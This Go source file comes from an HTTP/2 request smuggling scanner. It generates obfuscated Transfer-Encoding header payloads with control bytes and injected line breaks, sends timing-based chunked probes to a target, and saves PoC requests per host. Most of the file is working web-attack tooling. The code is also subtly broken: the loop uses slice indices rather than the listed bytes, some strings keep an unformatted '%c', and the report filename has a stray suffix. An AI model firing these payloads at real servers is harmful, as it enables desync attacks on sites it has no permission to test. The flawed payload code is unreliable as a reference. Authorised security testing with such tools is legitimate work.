package smuggler

import (
	"errors"
	"fmt"
	"io"
	"math"
	"math/rand/v2"
	"net"
	"os"
	"smuggler/config"
	"smuggler/smuggler/h2"
	"time"

	"github.com/rs/zerolog/log"
)

type H2 struct {
	*DesyncerImpl

	TE map[string][]string
}

func (h *H2) tePl() {
	h.TE = make(map[string][]string)

	if config.Glob.Test == "basic" {
		h.TE["Transfer-Encoding"] = append(h.TE["Transfer-Encoding"], "chunked")
		h.TE[" Transfer-Encoding"] = append(h.TE[" Transfer-Encoding"], "chunked")
		h.TE["Transfer-Encoding"] = append(h.TE["Transfer-Encoding"], "\tchunked")
		h.TE["Transfer-Encoding\t"] = append(h.TE["Transfer-Encoding\t"], "\tchunked")
		h.TE[" Transfer-Encoding "] = append(h.TE[" Transfer-Encoding "], " chunked")

		for i := range []byte{0x1, 0x4, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0x1F, 0x20, 0x7f, 0xA0, 0xFF} {
			h.TE["Transfer-Encoding"] = append(h.TE["Transfer-Encoding"], fmt.Sprintf("%cchunked", i))
			h.TE[fmt.Sprintf("Transfer-Encoding%c", i)] = append(h.TE[fmt.Sprintf("Transfer-Encoding%c", i)], "chunked")
			h.TE[fmt.Sprintf("%cTransfer-Encoding", i)] = append(h.TE[fmt.Sprintf("%cTransfer-Encoding", i)], "chunked")
			h.TE["Transfer-Encoding"] = append(h.TE["Transfer-Encoding"], fmt.Sprintf("chunked%c", i))
			h.TE[fmt.Sprintf("X: X%cTransfer-Encoding", i)] =
				append(h.TE[fmt.Sprintf("X: X%cTransfer-Encoding", i)], "chunked")
			h.TE["Transfer-Encoding"] = append(h.TE["Transfer-Encoding"], fmt.Sprintf("chunked%cX: X", i))
			h.TE[fmt.Sprintf("X: X\r%cTransfer-Encoding", i)] =
				append(h.TE[fmt.Sprintf("X: X\r%cTransfer-Encoding", i)], "chunked")
			h.TE[fmt.Sprintf("X: X%c\nTransfer-Encoding", i)] =
				append(h.TE[fmt.Sprintf("X: X%c\nTransfer-Encoding", i)], "chunked")
			h.TE["Transfer-Encoding"] = append(h.TE["Transfer-Encoding"], "chunked\r%cX")
			h.TE["Transfer-Encoding"] = append(h.TE["Transfer-Encoding"], "chunked%cX: X")
		}
	}
}

func (h *H2) Run() bool {
	// create a list of payloads and loop over them
	return h.runH2TE()
}

func (h *H2) runH2TE() bool {
	log.Info().Str("endpoint", h.URL.String()).Msg("Running H2TE desync tests...")
	ctr := 0
	h.tePl()
	defer clear(h.TE)
	for k, vv := range h.TE {
		for _, v := range vv {
			req := h.newReq(k, v)
			if h.h2te(req) {
				ctr++
				if config.Glob.ExitEarly {
					log.Info().
						Str("endpoint", h.URL.String()).
						Str("status", "success").
						Msgf("Test stopped on success: PoC payload stored in /result/%s directory", h.URL.Hostname())
					if config.Glob.Concurrent {
						h.TestDone <- struct{}{}
					}
					return true
				}
			}
			if config.Glob.Concurrent {
				select {
				case <-h.Ctx.Done():
					return false
				default:
				}
			}
		}
	}
	if ctr > 0 { // if eos, it shouldn't even come here on success
		log.Info().
			Str("endpoint", h.URL.String()).
			Str("status", "success").
			Msgf("finished H2TE desync tests: PoC payload stored in /result/%s directory", h.URL.Hostname())
	} else {
		log.Info().
			Str("endpoint", h.URL.String()).
			Str("status", "failure").
			Msg("finished H2TE desync tests: no issues found")
	}
	return false
}

func (h *H2) h2te(req *h2.Request) bool {
	ctr := 0
	for {
		req.Body = []byte("1\r\nG")
		ret, err := h.runTest(req)
		if ret != 1 {
			if ret == -1 {
				log.Debug().
					Str("endpoint", h.URL.String()).Err(err).Msg("")
			} else if ret == 2 {
				log.Debug().
					Str("endpoint", h.URL.String()).
					Msg("disconnected before timeout")
			}
			return false
		}
		req.Body = []byte("1\r\nG\r\n0\r\n\r\n")
		ret2, err := h.runTest(req)
		if ret2 == -1 {
			log.Debug().
				Str("endpoint", h.URL.String()).Err(err).Msg("")
			return false
		}
		if ret2 == 0 {
			ctr++
			if ctr < 3 {
				continue
			}
			req.Body = []byte("1\r\nG")
			log.Info().
				Str("endpoint", h.URL.String()).
				Msgf("Potential H2TE issue found - %s@%s://%s%s", config.Glob.Method,
					h.URL.Scheme, h.URL.Host, h.URL.Path)
			// generate a report here
			h.generateH2Report(req)
			return true
		}
		log.Debug().
			Str("endpoint", h.URL.String()).
			// Str("payload", h.HdrPl).
			Err(err).Msg("TE timeout on both payloads")
		return false
	}
}

func (h *H2) generateH2Report(req *h2.Request) {
	if err := createDir("/result/"); err != nil {
		log.Warn().Err(err).Msg("")
	}
	if err := createDir(fmt.Sprintf("/result/%s", h.URL.Hostname())); err != nil {
		log.Warn().Err(err).Msg("")
	}
	pwd, err := os.Getwd()
	if err != nil {
		log.Warn().Err(err).Msg("")
		return
	}
	fname := fmt.Sprintf("%s/result/%s/%ss", pwd, h.URL.Hostname(), h.URL.Query().Get("t"))
	file, err := os.OpenFile(fname, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Warn().Err(err).Msg("")
		return
	}
	defer file.Close()

	content := fmt.Sprintf("%s %s", req.Method, h.URL.EscapedPath())
	if len(h.URL.RawQuery) > 0 {
		content += "?" + h.URL.RawQuery
	}
	content += " HTTP/2\r\n:authority" + ": " + h.URL.Host + "\r\n"
	content += ":method" + ": " + req.Method + "\r\n"
	content += ":path" + ": " + h.URL.EscapedPath() + "\r\n"
	content += ":scheme: https\r\n"
	for k, vv := range req.Hdrs {
		for _, v := range vv {
			content += fmt.Sprintf("%s: %s\r\n", k, v)
		}
	}
	content += "\r\n"
	content += string(req.Body)
	file.WriteString(content)
}

func (h *H2) newReq(key, val string) *h2.Request {
	req := &h2.Request{
		URL:    h.URL,
		Method: config.Glob.Method,
	}
	clear(req.Hdrs)
	req.Hdrs = make(map[string][]string)
	for k, v := range h.Hdr { // add host headers and values
		req.Hdrs[k] = []string{v}
	}
	req.Hdrs[key] = []string{val} // add the payload in the headers
	return req
}

func (h *H2) runTest(req *h2.Request) (int, error) {
	t := h2.Transport{}
	req.URL = h.URL
	q := req.URL.Query()
	q.Set("t", fmt.Sprintf("%d", rand.Int32N(math.MaxInt32))) // avoid caching
	req.URL.RawQuery = q.Encode()
	start := time.Now()
	resp, err := t.RoundTrip(req)
	if err != nil {
		var netErr net.Error // check for timeout error
		if errors.As(err, &netErr) && netErr.Timeout() {
			return 1, err
		}
		return 0, err
	}
	diff := time.Since(start)

	sample := make([]byte, 100)
	if _, err := resp.Body.Read(sample); err != nil && err != io.EOF {
		return -1, err
	}
	resp.Body.Close()
	if len(sample) == 0 {
		if diff < config.Glob.Timeout-time.Second {
			return 2, nil
		}
		return 1, nil
	}
	return 0, nil
}
